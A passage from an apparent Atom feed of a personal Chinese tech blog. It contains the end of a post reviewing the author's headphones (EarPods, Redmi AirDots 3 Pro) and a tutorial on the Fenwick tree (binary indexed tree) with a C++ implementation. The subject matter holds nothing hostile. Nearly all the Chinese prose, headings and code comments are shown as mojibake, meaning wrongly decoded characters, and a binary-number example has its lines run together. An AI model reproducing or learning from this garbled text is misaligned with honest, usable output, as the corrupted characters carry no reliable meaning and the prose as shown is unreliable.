çš„å£°éŸ³è¡¨ç°ä¸è¡Œï¼Œç›¸åï¼Œå®ƒçš„ä¸‰é¢‘è¡¨ç°è¶³å¤Ÿå‡è¡¡ï¼Œè¶³ä»¥æ»¡è¶³ä¸ªäººçš„å¤§å¤šæ•°çš„å½±éŸ³éœ€æ±‚ã€‚å¦å¤–å¾—ç›Šäºå¼€æ”¾å¼çš„è®¾è®¡ï¼Œearpods ä½œä¸ºä¸€å‰¯è€³å¡å¼è€³æœºï¼Œæ‹¥æœ‰æ¯”å…¶ä»–å°é—­è€³å¡å¼è€³æœºæ›´åŠ å¼€é˜”çš„å£°åœºï¼Œæ•´ä½“çš„å¬æ„Ÿä¹Ÿæ›´é€šé€ã€‚</p><p>å¦å¤–è™½ç„¶ä¸ªäººä½¿ç”¨çš„ä¸å¤šï¼Œä½† earpods è¿™ä¸ªä¸èµ·çœ¼çš„çº¿æ§éº¦å…‹é£ä¹Ÿå€¼å¾—ä¸€è¯´ã€‚è¿™ä¸ªéº¦å…‹é£è™½å°ï¼Œä½†å´æ‹¥æœ‰ç›¸å½“ä¸é”™çš„æ”¶éŸ³è´¨é‡ï¼Œå‚è€ƒ RTINGS ä¸Šçš„è¯„åˆ†ï¼Œearpods çš„ Recording Quality é¡¹é«˜è¾¾ 8.1 åˆ†ï¼Œè¿™ä¸ªæˆç»©å·²ç»è¾¾åˆ°äº†å¾ˆå¤šæ¸¸æˆè€³æœºçš„æ°´å¹³ï¼Œè¶³ä»¥åº”ä»˜è¯­éŸ³é€šè¯å’Œçº¿ä¸Šä¼šè®®çš„éœ€æ±‚ï¼Œç¼ºç‚¹å°±æ˜¯å™ªéŸ³æŠ‘åˆ¶ä¸€èˆ¬ï¼Œéœ€è¦åœ¨å°½é‡å®‰é™çš„ç¯å¢ƒä¸­ä½¿ç”¨ã€‚</p><p>å®˜æ–¹ 149 å…ƒçš„å”®ä»·è‚¯å®šç§°ä¸ä¸Šè¶³å¤Ÿä¾¿å®œä»¥è‡³äºå½“æ¶ˆè€—å“æ¥ä½¿ç”¨ï¼Œä½†ç”±äºè¿™æ¬¾è€³æœºå·²ç»å‘å”®å¤šå¹´ï¼Œå¹¶ä¸”è´¨é‡è¶³å¤Ÿå‡ºè‰²ï¼Œä»¥è‡³äºåœ¨äºŒæ‰‹å¸‚åœºä¸Šçš„ä¿æœ‰é‡éå¸¸å¯è§‚ï¼ŒåŸºæœ¬ä¸Š 50 ~ 60 å…ƒçš„ä»·æ ¼å°±èƒ½æ·˜åˆ°ä¸€å‰¯æˆè‰²å¾ˆä¸é”™çš„ã€‚å› æ­¤åªè¦èƒ½å¤Ÿæ¥å—äºŒæ‰‹ï¼Œearpods è¿˜æ˜¯ä¸€ä¸ªç›¸å½“å…·æœ‰æ€§ä»·æ¯”çš„é€‰æ‹©ã€‚</p><h2 id="çº¢ç±³-Airdots3pro"><a href="#çº¢ç±³-Airdots3pro" class="headerlink" title="çº¢ç±³ Airdots3pro"></a>çº¢ç±³ Airdots3pro</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/redmi.jpg"></p><p>çº¢ç±³çš„è¿™å‰¯ TWS è¿˜æ˜¯ 21 å¹´çš„æ—¶å€™ä¹°çš„ï¼Œä½†æ˜¯ä¸ªäººä½¿ç”¨çš„å…¶å®å¹¶ä¸å¤šã€‚</p><p>è€³æœºçš„è´¨æ„Ÿè¿˜ç®—æ¯”è¾ƒå‡ºè‰²ï¼Œä½©æˆ´ä½“éªŒä¹Ÿå¾ˆä¸é”™ï¼Œæ¯”è¾ƒç‰¢å›ºä¸”èˆ’é€‚ã€‚å£°éŸ³è¡¨ç°æ”¾ç°åœ¨æ¥çœ‹æ˜¯æ¯”è¾ƒç³Ÿç³•çš„ï¼Œæ•´ä½“çš„å¬æ„Ÿæ¯”è¾ƒé—·ï¼Œå³ä½¿åˆ‡æ¢åˆ°é«˜éŸ³å¢å¼ºæ¨¡å¼ä¹Ÿæ²¡æœ‰å¤ªå¤§æ”¹å–„ï¼Œå½“ç„¶ä¹Ÿå¯èƒ½ä¸ä¸ªäººçš„å¬éŸ³å–œå¥½æœ‰å…³ï¼Œæ€»ä¹‹å¯¹æˆ‘è€Œè¨€ï¼Œæ‹¿å®ƒæ¥å¬éŸ³ä¹å¹¶ä¸æ˜¯ä¸€ä¸ªå¥½çš„é€‰æ‹©ã€‚ä½†æ¯•ç«Ÿæ˜¯æ³¨é‡ä¾¿æºçš„ TWSï¼ŒéŸ³è´¨æ–¹é¢æˆ‘ä¹Ÿæ²¡æœ‰æŠ±å¤ªé«˜çš„æœŸæœ›ï¼Œä¸»è¦è¿˜æ˜¯ä½¿ç”¨ä½“éªŒæ–¹é¢çš„é—®é¢˜ã€‚é¦–å…ˆä¾¿æ˜¯ç»­èˆªï¼Œæˆ‘è¿™å‰¯å°½ç®¡ä½¿ç”¨å¹¶ä¸é¢‘ç¹ï¼Œä½†å•æ¬¡ç»­èˆªå¤§æ¦‚åªæœ‰ 3 ~ 4 ä¸ªå°æ—¶äº†ï¼Œå¦‚æœå…¨ç¨‹å¼€å¯é™å™ªæˆ–é€šé€æ¨¡å¼çš„è¯è‚¯å®šä¼šæ›´ä½ï¼ŒåŠ ä¸Šå……ç”µä»“åçš„æ€»ç»­èˆªæ—¶é—´ä¸ªäººæ²¡æœ‰ç»Ÿè®¡è¿‡ï¼Œä¸è¿‡åº”è¯¥ä¹Ÿä¸ä¼šå¤ªä¹è§‚ã€‚æ­¤å¤–ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ï¼Œæˆ‘æ€»æ„Ÿè§‰åœ¨å¼€å¯é™å™ªæ¨¡å¼åæ—¶ä¸æ—¶ä¼šå‡ºç°å·¦å³è€³å‹ä¸ä¸€è‡´çš„æƒ…å†µï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯è½¯ä»¶ bugï¼Œæ€»ä¹‹ç›¸å½“å½±å“ä½“éªŒã€‚æœ€åå°±æ˜¯è€³æœºéº¦å…‹é£è²Œä¼¼åªæ”¯æŒé€šè¯æ—¶è°ƒç”¨ï¼Œå…¶ä»–åº”ç”¨æ— æ³•è°ƒç”¨ï¼Œå› æ­¤è¯¸å¦‚å¾®ä¿¡è§†é¢‘é€šè¯å’Œå½•éŸ³ç­‰åœºåˆåªèƒ½ä½¿ç”¨æ‰‹æœºè‡ªå¸¦éº¦å…‹é£ï¼ŒåŸå› ä¸æ˜ã€‚</p><p>è™½è¯´ airdots3pro çš„ä½¿ç”¨ä½“éªŒæ”¾ä»Šå¤©æ¥çœ‹å¹¶ä¸ç†æƒ³ï¼Œä½†æˆ‘ç›®å‰å¹¶æ²¡æœ‰æ‰“ç®—æ›´æ¢ï¼Œæ¯•ç«Ÿæˆ‘ç°åœ¨è¿˜æ˜¯æ›´ä¹ æƒ¯æœ‰çº¿è€³æœºå³æ’å³ç”¨ã€ä¸ç”¨æ‹…å¿ƒç”µé‡é—®é¢˜çš„çœå¿ƒæ„Ÿã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ€è¿‘å‡ ä¸ªæœˆçœ‹äº†ä¸å°‘è€³æœºç›¸å…³çš„å†…å®¹ï¼Œåˆæ­¥äº†è§£äº†ä¸€äº›è€³æœºçš„å‚æ•°æŒ‡æ ‡ä»¥åŠé€‰è´­æ–¹æ¡ˆï¼ŒåŒæ—¶ä¹Ÿç»™è‡ªå·±ä½¿ç”¨çš„è€³æœºè¿›è¡Œäº†ä¸€æ³¢æ›´æ–°æ¢ä»£ã€‚æœ¬æ–‡å°±ç®€å•ç›˜ç‚¹ä¸€ä¸‹è‡ªå·±ä¹‹å‰ç”¨è¿‡çš„å’Œç°åœ¨æ­£åœ¨ä½¿ç”¨çš„è€³æœºï¼Œå†…å®¹å®Œå…¨åŸºäºä¸ªäººçš„ä½¿ç”¨ä½“éªŒã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ•°ç " scheme="http://lordaeronesz.github.io/categories/%E6%95%B0%E7%A0%81/"/>
    
    
    <category term="é—²è°ˆ" scheme="http://lordaeronesz.github.io/tags/%E9%97%B2%E8%B0%88/"/>
    
    <category term="ç»éªŒ" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="æ•°ç " scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>åŠ¨æ€å‰ç¼€å’Œæ•°ç»„ï¼šæ ‘çŠ¶æ•°ç»„</title>
    <link href="http://lordaeronesz.github.io/2024/03/03/%E5%8A%A8%E6%80%81%E5%89%8D%E7%BC%80%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%9A%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    <id>http://lordaeronesz.github.io/2024/03/03/%E5%8A%A8%E6%80%81%E5%89%8D%E7%BC%80%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%9A%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/</id>
    <published>2024-03-03T01:03:08.000Z</published>
    <updated>2024-03-04T07:14:33.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰ç¼€å’Œçš„ä¸è¶³"><a href="#å‰ç¼€å’Œçš„ä¸è¶³" class="headerlink" title="å‰ç¼€å’Œçš„ä¸è¶³"></a>å‰ç¼€å’Œçš„ä¸è¶³</h1><p>å‰ç¼€å’Œæ˜¯ä¸€ç§å¸¸è§çš„ç®—æ³•æ€æƒ³ï¼Œèƒ½å¤Ÿå®ç°åœ¨å¸¸æ•°æ—¶é—´å¤æ‚åº¦ä¸‹å¾—åˆ°æŸä¸ªå­åŒºé—´å†…æ‰€æœ‰å…ƒç´ å’Œã€‚ä»¥ä¸€ç»´æ•°ç»„ nums ä¸ºä¾‹ï¼Œå®šä¹‰å‰ç¼€å’Œæ•°ç»„ preSumï¼Œ<code>preSum[i]</code> è¡¨ç¤º nums å‰ i ä¸ªå…ƒç´ çš„å’Œï¼Œåˆ©ç”¨åŠ¨æ€è§„åˆ’çš„æ€æƒ³ï¼Œæ˜“å¾— <code>preSum[i] = preSum[i - 1] + nums[i]</code> çš„é€’æ¨å…³ç³»ï¼Œå› æ­¤æ„é€ ä¸€ä¸ªå‰ç¼€å’Œæ•°ç»„çš„æ—¶é—´å¤æ‚åº¦ä¸º O(n)ï¼Œè€ŒæŸ¥è¯¢å‰ i ä¸ªå…ƒç´ çš„å’Œåªéœ€æŸ¥è¯¢ <code>preSum[i]</code> çš„å€¼ï¼Œä¸ºå¸¸æ•°æ—¶é—´ã€‚</p><p>å‰ç¼€å’Œæ–¹æ³•åœ¨æ•°ç»„å…ƒç´ ä¸å‘ç”Ÿæ”¹å˜çš„æƒ…å†µä¸‹ååˆ†é«˜æ•ˆï¼Œä½†å¦‚æœæ•°ç»„å…ƒç´ å¯èƒ½ä¼šå‘ç”Ÿæ”¹å˜ï¼Œä¸æœ´ç´ æ±‚å’Œåšæ³•ï¼ˆä¸ä½¿ç”¨å‰ç¼€å’Œæ•°ç»„ï¼Œè€Œæ˜¯ç›´æ¥éå†åŒºé—´å…ƒç´ ç´¯è®¡æ±‚å’Œï¼‰ç›¸æ¯”ï¼Œå‰ç¼€å’Œæ•°ç»„éœ€è¦ O(n) çš„æ—¶é—´æ¥è¿›è¡Œæ›´æ–°ã€‚è¿™ä¸¤ç§åšæ³•è¦ä¹ˆæŸ¥è¯¢æ˜¯ O(1)ã€æ›´æ–°æ˜¯ O(n)ï¼Œè¦ä¹ˆæŸ¥è¯¢æ˜¯ O(n)ã€æ›´æ–°æ˜¯ O(1)ï¼Œé‚£æœ‰æ²¡æœ‰ä¸€ç§æŠ˜è¡·çš„æ–¹æ¡ˆï¼Œä½¿å¾—æŸ¥è¯¢å’Œæ›´æ–°æ•ˆç‡éƒ½ä¸è‡³äºå¤ªä½å‘¢ï¼Ÿæœ¬æ–‡å°†ä»‹ç»çš„æ ‘çŠ¶æ•°ç»„å°±ç¬¦åˆè¿™æ ·çš„æ¡ä»¶ã€‚</p><span id="more"></span><h1 id="æ ‘çŠ¶æ•°ç»„"><a href="#æ ‘çŠ¶æ•°ç»„" class="headerlink" title="æ ‘çŠ¶æ•°ç»„"></a>æ ‘çŠ¶æ•°ç»„</h1><h2 id="æŸ¥è¯¢"><a href="#æŸ¥è¯¢" class="headerlink" title="æŸ¥è¯¢"></a>æŸ¥è¯¢</h2><p>ç”±æ­£æ•´æ•°çš„äºŒè¿›åˆ¶è¡¨ç¤ºå¯çŸ¥ï¼Œä»»ä½•ä¸€ä¸ªæ­£æ•´æ•°éƒ½å¯ä»¥æ‹†åˆ†ä¸ºä¸ºè‹¥å¹²ä¸ªä¸é‡å¤çš„ 2 çš„å¹‚ä¹‹å’Œã€‚é‚£ä¹ˆå¯¹äºä¸€ä¸ªä¸‹æ ‡ä» 1 å¼€å§‹ä¸”é•¿åº¦ä¸º n çš„æ•°ç»„ï¼Œå®ƒçš„ä»»æ„ä¸‹æ ‡ i (1 &lt;= i &lt; n) ä¹Ÿå¯ä»¥ä¾ç…§æ­¤æ–¹æ¡ˆè¿›è¡Œæ‹†åˆ†ï¼Œä¾‹å¦‚ 7 = 4 + 2 + 1ï¼Œé‚£ä¹ˆå¯¹äºä¸€ä¸ªåŒºé—´ [1 ~ 7]ï¼Œä»¤è¢«æ‹†åˆ†å¾—åˆ°çš„å„æ•´æ•°ä¸ºåŒºé—´é•¿åº¦ï¼ŒæŒ‰ç…§ä»å¤§åˆ°å°çš„é¡ºåºï¼Œä¾æ¬¡ä»å·¦åˆ°å³å¯¹åŒºé—´è¿›è¡Œåˆ†å‰²ï¼Œå¾—åˆ°çš„å„å­åŒºé—´ä¸º [1 ~ 4]ã€[5 ~ 6] å’Œ [7 ~ 7]ã€‚è¿™æ ·åˆ†å‰²å…·å¤‡ä¸€ä¸ªéå¸¸å¥½çš„æ€§è´¨ï¼š</p><p><em>å¯¹äºåˆ†å‰²åå¾—åˆ°çš„ä»»ä½•å­åŒºé—´ [l, r]ï¼Œr å¿…å®šå”¯ä¸€ï¼Œä¸” r çš„ä¸ªæ•°æ­£å¥½ç­‰äº n.</em></p><p>ä¹Ÿå°±æ˜¯è¯´ä¸å­˜åœ¨ä¸¤ä¸ªå­åŒºé—´ [l1, r1]ã€[l2, r2] æ»¡è¶³ï¼šr1 = r2 ä¸” l1 â‰  l2. é‚£ä¹ˆå°±å¯ä»¥ä»¥ r ä¸ºå…³é”®å­—ï¼ˆä¸‹æ ‡ï¼‰ï¼Œæ„é€ ä¸€ä¸ªæ•°ç»„ treeï¼Œ<code>tree[r]</code> è¡¨ç¤ºåŒºé—´ [l, r] ï¼ˆè‹¥ r ç¡®å®šï¼Œåˆ™ l ä¹Ÿç¡®å®šï¼‰çš„å…ƒç´ å’Œã€‚é‚£ä¹ˆæ ¹æ® 7 = 4 + 2 + 1ï¼Œæœ‰ <code>preSum[7] = tree[4] + tree[6] + tree[7]</code>ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå›¾ä¸­ç»™å‡ºäº†å¯¹ä¸‹æ ‡ 1 ~ 16 è¿›è¡Œæ‹†åˆ†çš„ç»“æœã€‚</p><p><img src="/2024/03/03/%E5%8A%A8%E6%80%81%E5%89%8D%E7%BC%80%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%9A%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/tree.png"></p><p>ç”±äºä»»ä½•ä¸€ä¸ªæ­£æ•´æ•° i æ‹†åˆ†åçš„æ•´æ•°æ•°ä¸ºå…¶äºŒè¿›åˆ¶è¡¨ç¤ºä¸­ 1 çš„ä¸ªæ•°ï¼Œä»¤è¯¥ä¸ªæ•°ä¸º nsï¼Œå¯¹äºåŒºé—´ [1, i]ï¼Œå…¶æ‹†åˆ†å¾—åˆ°åŒºé—´ä¸ªæ•°ä¹Ÿä¸º nsï¼Œå³ <code>preSum[i]</code> æœ€å¤šç”± ns ä¸ª tree æ•°ç»„å…ƒç´ ç´¯åŠ å¾—åˆ°ï¼Œå› æ­¤å‰ç¼€å’Œçš„æŸ¥è¯¢æ•ˆç‡ä¸º O(logn). </p><h2 id="æ›´æ–°"><a href="#æ›´æ–°" class="headerlink" title="æ›´æ–°"></a>æ›´æ–°</h2><p>ä¸Šå›¾ä¸­çš„è¿æ¥çº¿ä»£è¡¨äº† nums æ•°ç»„å…ƒç´ ï¼ˆé»„è‰²æ–¹æ ¼ï¼‰å’Œ tree æ•°ç»„å…ƒç´ ï¼ˆè“è‰²æ–¹æ ¼ï¼‰ä»¥åŠä¸åŒ tree æ•°ç»„å…ƒç´ ä¹‹é—´çš„ç›¸äº’ä¾èµ–å…³ç³»ï¼Œè‹¥ nums æ•°ç»„å…ƒç´ å‘ç”Ÿæ”¹å˜ï¼Œä¾¿éœ€è¦æ ¹æ®ä¸Šè¿°ä¾èµ–å…³ç³»è‡ªåº•å‘ä¸Šå¯¹ tree æ•°ç»„å…ƒç´ è¿›è¡Œæ›´æ–°ï¼Œä»¥ä¿è¯æŸ¥è¯¢çš„æ­£ç¡®æ€§ï¼Œé—®é¢˜å°±åœ¨äºå¦‚ä½•ç”¨è§„èŒƒçš„æ•°å­¦è¯­è¨€è¡¨ç¤ºå›¾ä¸­æ‰€ç¤ºçš„ä¾èµ–å…³ç³»ã€‚</p><p>æ—¢ç„¶åŒºé—´çš„åˆ†å‰²ä¸»è¦åŸºäºäºŒè¿›åˆ¶çš„ä½çº§è¡¨ç¤ºï¼Œé‚£ä¹ˆå…ƒç´ æ›´æ–°çš„ä¾èµ–å…³ç³»ä¹Ÿä¸å¦¨ä»äºŒè¿›åˆ¶çš„è§’åº¦å‡ºå‘ã€‚é¦–å…ˆè§‚å¯Ÿä¸‹æ ‡ 9 çš„æ›´æ–°è·¯å¾„ï¼š9 -&gt; 10 -&gt; 12 -&gt; 16ï¼Œå…¶äºŒè¿›åˆ¶è¡¨ç¤ºåˆ†åˆ«ä¸ºï¼š</p><pre class="language-none"><code class="language-none"> 9: 0100110: 0101012: 0110016: 10000</code></pre><p>ä¼¼ä¹æœ‰ 10 = 9 + 1ï¼Œ12 = 10 + 2ï¼Œ16 = 12 + 4 çš„å…³ç³»å­˜åœ¨ã€‚å…¶ä¸­ä¸‹æ ‡æ¯æ¬¡å¢åŠ çš„å€¼éƒ½ä¸º 2 çš„å¹‚ï¼Œä¸”è¯¥ 2 çš„å¹‚å³ä¸ºå½“å‰ä¸‹æ ‡ i æŒ‰ä¸Šè¿°è§„åˆ™æ‹†åˆ†åå¾—åˆ°çš„æœ€å°çš„æ•°å­—ã€‚äº‹å®ä¹Ÿçš„ç¡®å¦‚æ­¤ï¼ˆå…·å¤‡æ•°å­¦è¯æ˜å¯ä»¥å‚è€ƒ<a href="https://leetcode.cn/problems/range-sum-query-mutable/solutions/2524481/dai-ni-fa-ming-shu-zhuang-shu-zu-fu-shu-lyfll">å¸¦ä½ å‘æ˜æ ‘çŠ¶æ•°ç»„ï¼é™„æ•°å­¦è¯æ˜</a>ï¼‰ï¼Œè¿™ä¸ªæœ€å°æ•°å­—é€šå¸¸ç§°ä¸ºä¸€ä¸ªæ•°çš„ <strong>lowbit</strong>ï¼Œå³ <code>lowbit[9] = 1</code>ã€<code>lowbit[10] = 2</code>ã€<code>lowbit[12] = 4</code>ã€‚</p><p>å¾—åˆ°è¿™ä¸ªè§„å¾‹åï¼Œæ›´æ–°æ“ä½œä¾¿å¾ˆå®¹æ˜“äº†ï¼šè‹¥ <code>nums[i]</code> æ”¹å˜ï¼Œåˆ™é¦–å…ˆæ›´æ–° <code>tree[i]</code>ï¼Œç„¶å <code>i += lowbit(i)</code>ï¼Œç»§ç»­æ›´æ–° <code>tree[i]</code>ï¼Œç›´åˆ° i è¶…å‡ºäº†æ•°ç»„çš„èŒƒå›´ï¼Œæ›´æ–°ç»“æŸã€‚æ³¨æ„åˆ°ï¼Œ<code>lowbit[i]</code> åœ¨æ›´æ–°è¿‡ç¨‹ä¸­æ˜¯ä¸æ–­å¢å¤§çš„ï¼Œå› æ­¤æ›´æ–°æ¬¡æ•°æœ€å¤šä¸è¶…è¿‡ logn æ¬¡ï¼Œå³ tree æ•°ç»„çš„æ›´æ–°æ•ˆç‡ä¸º O(logn).</p><h2 id="æ„é€ "><a href="#æ„é€ " class="headerlink" title="æ„é€ "></a>æ„é€ </h2><p>äº†è§£äº†å¦‚ä½•æ ¹æ® tree æ•°ç»„è®¡ç®—å‰ç¼€å’Œä»¥åŠå¦‚ä½•æ›´æ–° tree æ•°ç»„åï¼Œæ¥ä¸‹æ¥çš„é—®é¢˜å°±æ˜¯å¦‚ä½•åˆå§‹åŒ– tree æ•°ç»„çš„å€¼ã€‚ä¸€ä¸ªç®€å•çš„åšæ³•æ˜¯å…ˆå°† tree æ•°ç»„å„å…ƒç´ åˆå§‹åŒ–ä¸º 0ï¼Œå†ä¾æ¬¡å¯¹æ¯ä¸ª <code>nums[i]</code> æ‰§è¡Œæ›´æ–°æ“ä½œï¼Œè¿™ç§æ–¹æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸º O(nlogn)ã€‚</p><p>æ³¨æ„ tree æ•°ç»„çš„ä¸‹æ ‡ä»£è¡¨åˆ†å‰²åŒºé—´çš„å³ç«¯ç‚¹ä½ç½®ï¼Œå¦‚æœå½“å‰æ›´æ–°åˆ°äº†ä¸‹æ ‡ i çš„ä½ç½®ï¼Œé‚£ä¹ˆè¯´æ˜ <code>tree[i]</code> çš„å€¼å·²ç»åˆå§‹åŒ–å®Œæ¯•ï¼ˆ<code>nums[j](j &gt; i)</code> ä¸ <code>tree[i]</code> æ— å…³ï¼‰ï¼Œå› æ­¤å¯ç›´æ¥å°†è¯¥å€¼åŠ å…¥ <code>tree[i + lowbit(i)]</code> ä¸­ã€‚</p><h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">binaryIndexedTree</span> <span class="token punctuation">&#123;</span><span class="token keyword">private</span><span class="token operator">:</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> tree<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums<span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token function">binaryIndexedTree</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">nums</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">tree</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>tree<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> nums<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> next <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// i &amp; -i å³ä¸º lowbit(i)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>next <span class="token operator">&lt;=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>tree<span class="token punctuation">[</span>next<span class="token punctuation">]</span> <span class="token operator">+=</span> tree<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> dv <span class="token operator">=</span> val <span class="token operator">-</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tree<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> i <span class="token operator">&amp;</span> <span class="token operator">-</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>tree<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> dv<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">preSum</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// åŒºé—´ nums[0~idx) çš„å’Œ</span><span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>idx <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sum <span class="token operator">+=</span> tree<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>idx <span class="token operator">-=</span> <span class="token punctuation">(</span>idx <span class="token operator">&amp;</span> <span class="token operator">-</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰ç¼€å’Œçš„ä¸è¶³&quot;&gt;&lt;a href=&quot;#å‰ç¼€å’Œçš„ä¸è¶³&quot; class=&quot;headerlink&quot; title=&quot;å‰ç¼€å’Œçš„ä¸è¶³&quot;&gt;&lt;/a&gt;å‰ç¼€å’Œçš„ä¸è¶³&lt;/h1&gt;&lt;p&gt;å‰ç¼€å’Œæ˜¯ä¸€ç§å¸¸è§çš„ç®—æ³•æ€æƒ³ï¼Œèƒ½å¤Ÿå®ç°åœ¨å¸¸æ•°æ—¶é—´å¤æ‚åº¦ä¸‹å¾—åˆ°æŸä¸ªå­åŒºé—´å†…æ‰€æœ‰å…ƒç´ å’Œã€‚ä»¥ä¸€ç»´æ•°ç»„ nums ä¸ºä¾‹ï¼Œå®šä¹‰å‰ç¼€å’Œæ•°ç»„ preSumï¼Œ&lt;code&gt;preSum[i]&lt;/code&gt; è¡¨ç¤º nums å‰ i ä¸ªå…ƒç´ çš„å’Œï¼Œåˆ©ç”¨åŠ¨æ€è§„åˆ’çš„æ€æƒ³ï¼Œæ˜“å¾— &lt;code&gt;preSum[i] = preSum[i - 1] + nums[i]&lt;/code&gt; çš„é€’æ¨å…³ç³»ï¼Œå› æ­¤æ„é€ ä¸€ä¸ªå‰ç¼€å’Œæ•°ç»„çš„æ—¶é—´å¤æ‚åº¦ä¸º O(n)ï¼Œè€ŒæŸ¥è¯¢å‰ i ä¸ªå…ƒç´ çš„å’Œåªéœ€æŸ¥è¯¢ &lt;code&gt;preSum[i]&lt;/code&gt; çš„å€¼ï¼Œä¸ºå¸¸æ•°æ—¶é—´ã€‚&lt;/p&gt;
